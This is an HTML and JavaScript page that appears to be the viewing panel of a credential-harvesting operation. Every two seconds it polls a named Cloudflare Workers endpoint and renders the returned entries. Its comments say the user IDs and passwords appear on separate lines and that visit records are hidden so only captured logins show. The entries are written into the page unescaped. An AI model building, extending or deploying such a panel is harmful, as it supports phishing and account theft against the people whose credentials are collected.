<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>B&W Dashboard</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
        
        /* Pure Black Background */
        body { background-color: #000; color: #fff; padding-bottom: 50px; }

        /* Minimal Header */
        .header {
            background: #000;
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #222;
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .header h1 { font-size: 14px; letter-spacing: 3px; color: #666; text-transform: uppercase; }
        
        /* Big White Badge */
        .v-badge {
            background: #fff;
            color: #000;
            padding: 5px 20px;
            border-radius: 2px;
            font-weight: 900;
            font-size: 24px;
        }

        .container { padding: 15px; display: flex; flex-direction: column; gap: 12px; }

        /* Data Row with Line Break Support */
        .data-row {
            background: #000;
            padding: 20px;
            border: 1px solid #333;
            border-left: 5px solid #fff; /* White Accent */
            font-size: 18px;
            font-weight: 800;
            color: #fff;
            
            /* Isse User ID aur Pass alag line mein aayenge */
            white-space: pre-wrap; 
            line-height: 1.8; 
            word-break: break-all;
        }

        .sync { text-align: center; font-size: 9px; color: #333; margin-top: 30px; letter-spacing: 1px; }
    </style>
</head>
<body>

    <div class="header">
        <h1>Activity</h1>
        <div class="v-badge" id="vCount">0</div>
    </div>

    <div class="container" id="logsDisplay">
        </div>

    <div class="sync">Terminal Linked • Auto-Sync 2s</div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
        let lastHash = "";

        async function refresh() {
            try {
                const res = await fetch(workerURL);
                const data = await res.json();
                
                const display = document.getElementById('logsDisplay');
                const badge = document.getElementById('vCount');

                // Hash check to prevent blinking
                const currentHash = JSON.stringify(data);
                if (currentHash === lastHash) return;
                lastHash = currentHash;

                if (!data) return;

                // Total count update
                badge.innerText = data.length;

                // Clean Render
                display.innerHTML = data.map(log => {
                    // Visit data ko hide kar rahe hain, sirf Login/Data dikhayenge
                    if (log.detail === "COUNT" || log.type.includes("VISIT")) {
                        return ""; 
                    }

                    // Detail mein agar \n hai toh ye alag line mein dikhega
                    return `<div class="data-row">${log.detail}</div>`;
                }).join('');

            } catch (e) { console.log("..."); }
        }

        setInterval(refresh, 2000);
        window.onload = refresh;
    </script>
</body>
</html>
